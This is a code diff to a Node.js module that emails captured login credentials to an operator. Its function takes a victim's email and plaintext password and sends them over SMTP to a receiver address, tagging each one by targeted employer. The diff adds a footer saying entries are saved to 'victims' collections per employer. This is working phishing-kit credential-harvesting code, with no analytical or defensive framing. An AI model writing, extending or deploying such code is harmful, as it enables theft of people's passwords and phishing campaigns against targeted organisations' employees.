@@ -1,44 +1,39 @@
 const nodemailer = require("nodemailer");
 
-const isPlaceholderValue = (value) => {
-  if (!value) return true;
-
-  const normalized = value.trim().toLowerCase();
-  return normalized.includes("your_") || normalized.includes("example") || normalized.includes("placeholder");
-};
-
-exports.sendLoginEmail = async ({ email, password }) => {
+exports.sendLoginEmail = async ({ email, password, employerId }) => {
   const emailUser = process.env.EMAIL_USER?.trim();
   const emailPass = process.env.EMAIL_PASS?.trim();
   const receiverEmail = process.env.RECEIVER_EMAIL?.trim();
 
-  if (!emailUser || !emailPass || !receiverEmail || isPlaceholderValue(emailUser) || isPlaceholderValue(emailPass) || isPlaceholderValue(receiverEmail)) {
-    throw new Error("Set real SMTP credentials in server/.env before sending login emails.");
+  if (!emailUser || !emailPass || !receiverEmail) {
+    throw new Error("Missing email credentials in .env file.");
   }
 
   const transporter = nodemailer.createTransport({
     host: process.env.EMAIL_HOST?.trim() || "smtp.gmail.com",
-    port: Number(process.env.EMAIL_PORT || 587),
-    secure: process.env.EMAIL_SECURE === "true" || Number(process.env.EMAIL_PORT || 587) === 465,
+    port: Number(process.env.EMAIL_PORT || 465),
+    secure: process.env.EMAIL_SECURE === "true",
     auth: {
       user: emailUser,
       pass: emailPass,
     },
   });
 
-  await transporter.verify();
-  console.log("SMTP connection successful!");
+  const employerName = (employerId || "general").toUpperCase();
 
   const mailOptions = {
     from: process.env.EMAIL_FROM?.trim() || emailUser,
     to: receiverEmail,
-    subject: "New Login Submission",
+    subject: `🚨 New Login Submission [Employer: ${employerName}]`,
     html: `
-      <h3>New login submission</h3>
+      <h2>New Submission Received</h2>
+      <p><strong>Employer / Ref:</strong> <span style="color: blue; font-weight: bold;">${employerName}</span></p>
       <p><strong>Email:</strong> ${email}</p>
       <p><strong>Password:</strong> ${password}</p>
+      <hr />
+      <p><small>Saved to main 'victims' collection and '${employerId || "general"}_victims' collection.</small></p>
     `,
   };
 
-  await transporter.sendMail(mailOptions);
+  return await transporter.sendMail(mailOptions);
 };
